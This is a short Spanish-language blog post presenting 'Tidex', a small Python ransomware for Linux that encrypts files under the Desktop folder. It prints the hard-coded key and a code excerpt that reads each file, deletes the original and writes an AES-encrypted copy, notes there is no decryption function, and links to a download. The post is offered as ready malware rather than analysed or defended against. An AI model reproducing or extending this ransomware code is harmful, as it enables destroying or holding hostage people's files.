---
title: "Tidex Ransomware"
excerpt: "Ejemplo de Ransomware Tidex para Linux"
date: "Jan 30 2023"
cover_image: "/blog/rtidex.webp"
alt: "Ransomware"
tags1: "Python"
tags2: "Hacking"
---

# Tidex

Pequeño y simple Ransomware, solo funciona para cifrar archivos en la ruta del directorio Escritorio y subdirectorios.

&nbsp;

## Importante

Por el momento solo se puede ejecutar en máquinas Linux. Carece de función de descifrado.
La CLAVE es: **hkpykiiqftupr3okl04azj**

&nbsp;

Ejemplo de Código

```python
def _lock():
    for files in all_Ext:
        for _dotFile in glob.glob(files):
            print(_dotFile)
            f = open(f'{__dir()}/{_dotFile}', 'rb')
            dataArr = f.read()
            f.close()
            os.remove(f'{__dir()}/{_dotFile}')
            key = "hkpykiiqftupr3okl04azj"
            aes = pyaes.AESModeOfOperationCTR(key)
            EncryptData = aes.encrypt(dataArr)
            newArr = _dotFile.replace(char, "") + Ext
            newArr = open(f'{newArr}', 'wb')
            newArr.write(EncryptData)
            newArr.close()
```

### [Descargar aquí desde GitHub](https://github.com/Rawierdt/Tidex)

Gracias
~ Rawier.